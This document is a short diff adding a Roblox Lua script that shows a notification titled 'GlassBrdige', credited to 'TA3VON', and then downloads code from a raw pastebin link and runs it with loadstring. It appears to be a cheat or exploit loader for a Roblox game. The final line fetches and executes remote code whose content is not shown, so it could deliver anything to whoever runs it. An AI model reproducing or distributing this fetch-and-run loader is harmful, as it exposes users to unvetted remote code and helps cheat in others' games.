@@ -1,0 +1,6 @@
+game:GetService("StarterGui"):SetCore("SendNotification",{
+    Title = "GlassBrdige";
+    Text = "Made by TA3VON";
+            })
+            
+            loadstring(game:HttpGet('https://pastebin.com/raw/T7CqyjEW'))()
